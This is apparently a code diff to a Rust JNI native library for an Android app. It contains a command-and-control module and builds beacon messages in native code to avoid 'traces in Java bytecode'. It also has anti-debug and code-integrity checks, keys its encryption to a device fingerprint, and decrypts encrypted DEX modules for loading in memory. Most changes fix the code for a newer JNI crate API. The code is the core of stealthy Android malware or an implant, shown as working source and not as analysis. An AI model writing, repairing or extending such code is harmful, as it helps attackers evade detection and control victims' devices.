@@ -1,7 +1,10 @@
 use jni::JNIEnv;
-use jni::objects::{JClass, JString, JByteArray};
-use jni::sys::{jbyteArray, jstring};
+use jni::objects::{JClass, JObject, JString, JByteArray};
+use jni::sys::{jboolean, jbyteArray, jstring};
 use std::sync::{Arc, Mutex};
+
+#[macro_use]
+extern crate lazy_static;
 
 mod crypto;
 mod c2_protocol;
@@ -42,7 +45,7 @@ impl CryptoContext {
 /// Encrypt message with AES-256-GCM
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_encryptMessage(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     plaintext: JByteArray,
     key_id: JString,
@@ -77,7 +80,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_encryptMessag
 
     // Return as jbyteArray
     match env.byte_array_from_slice(&ciphertext) {
-        Ok(arr) => arr,
+        Ok(arr) => arr.into_raw(),
         Err(_) => std::ptr::null_mut(),
     }
 }
@@ -85,7 +88,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_encryptMessag
 /// Decrypt message with AES-256-GCM
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_decryptMessage(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     ciphertext: JByteArray,
     key_id: JString,
@@ -116,7 +119,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_decryptMessag
 
     // Return as jbyteArray
     match env.byte_array_from_slice(&plaintext) {
-        Ok(arr) => arr,
+        Ok(arr) => arr.into_raw(),
         Err(_) => std::ptr::null_mut(),
     }
 }
@@ -124,7 +127,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_decryptMessag
 /// Derive session key from device fingerprint (environmental keying)
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_deriveSessionKey(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     device_fingerprint: JString,
     key_id: JString,
@@ -153,7 +156,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_deriveSession
     // Return key hash for verification
     let key_hash = hex::encode(crypto::sha256(&session_key.key));
     match env.new_string(&key_hash) {
-        Ok(s) => s.into_inner(),
+        Ok(s) => JObject::from(s).into_raw(),
         Err(_) => std::ptr::null_mut(),
     }
 }
@@ -161,7 +164,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_deriveSession
 /// Rotate session key (periodically called)
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_rotateKey(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     key_id: JString,
 ) -> jboolean {
@@ -191,7 +194,7 @@ pub extern "C" fn Java_com_random_package_name_crypto_NativeCrypto_rotateKey(
 /// Build BeaconMessage in native (no traces in Java bytecode)
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_network_NativeC2_buildBeaconMessage(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     device_id: JString,
     session_id: JString,
@@ -199,24 +202,20 @@ pub extern "C" fn Java_com_random_package_name_network_NativeC2_buildBeaconMessa
     payload: JString,
 ) -> jbyteArray {
     let device_id_str = env.get_string(&device_id)
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_default();
 
     let session_id_str = env.get_string(&session_id)
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_default();
 
     let msg_type = env.get_string(&message_type)
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_default();
 
     let payload_str = env.get_string(&payload)
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_default();
 
     // Build message in native
     let message = C2Message {
@@ -238,7 +237,7 @@ pub extern "C" fn Java_com_random_package_name_network_NativeC2_buildBeaconMessa
     };
 
     match env.byte_array_from_slice(&binary) {
-        Ok(arr) => arr,
+        Ok(arr) => arr.into_raw(),
         Err(_) => std::ptr::null_mut(),
     }
 }
@@ -271,7 +270,7 @@ pub extern "C" fn Java_com_random_package_name_anti_NativeAntiDebug_isDetectionE
 /// Anti-tampering check (verify code integrity)
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_anti_NativeAntiDebug_verifyCodeIntegrity(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     expected_hash: JString,
 ) -> jboolean {
@@ -290,42 +289,13 @@ pub extern "C" fn Java_com_random_package_name_anti_NativeAntiDebug_verifyCodeIn
 }
 
 // ============================================================================
-// JNI: ENVIRONMENT VALIDATION
-// ============================================================================
-
-/// Validate device environment (environmental keying)
-#[no_mangle]
-pub extern "C" fn Java_com_random_package_name_environment_NativeEnvironment_validateEnvironment(
-    env: JNIEnv,
-    _class: JClass,
-    expected_fingerprint_hash: JString,
-) -> jboolean {
-    let expected = match env.get_string(&expected_fingerprint_hash) {
-        Ok(s) => s.to_string_lossy().to_string(),
-        Err(_) => return 0,
-    };
-
-    // Calculate actual device fingerprint (in native)
-    let actual = match environment::get_device_fingerprint_hash() {
-        Ok(hash) => hash,
-        Err(_) => return 0,
-    };
-
-    if actual == expected {
-        1
-    } else {
-        0 // Device fingerprint mismatch
-    }
-}
-
-// ============================================================================
 // MODULE SYSTEM: LOAD DEX IN-MEMORY
 // ============================================================================
 
 /// Load encrypted DEX module directly into memory
 #[no_mangle]
 pub extern "C" fn Java_com_random_package_name_modules_NativeModuleLoader_decryptAndLoadModule(
-    env: JNIEnv,
+    mut env: JNIEnv,
     _class: JClass,
     encrypted_module: JByteArray,
     module_key: JString,
@@ -337,14 +307,12 @@ pub extern "C" fn Java_com_random_package_name_modules_NativeModuleLoader_decryp
     };
 
     let key_str = env.get_string(&module_key)
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_default();
 
     let name = env.get_string(&module_name)
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_default();
 
     // Decrypt module
     let ctx = CRYPTO_CONTEXT.lock().unwrap();
@@ -361,11 +329,11 @@ pub extern "C" fn Java_com_random_package_name_modules_NativeModuleLoader_decryp
 
     // Verify module hash
     let module_hash = crypto::sha256(&decrypted);
-    android::log::info!("Module {} decrypted, hash: {}", name, hex::encode(&module_hash));
+    android::log::info(&format!("Module {} decrypted, hash: {}", name, hex::encode(&module_hash)));
 
     // Return decrypted DEX
     match env.byte_array_from_slice(&decrypted) {
-        Ok(arr) => arr,
+        Ok(arr) => arr.into_raw(),
         Err(_) => std::ptr::null_mut(),
     }
 }
@@ -373,9 +341,6 @@ pub extern "C" fn Java_com_random_package_name_modules_NativeModuleLoader_decryp
 // ============================================================================
 // UTILS
 // ============================================================================
-
-#[macro_use]
-extern crate lazy_static;
 
 mod android {
     pub mod log {
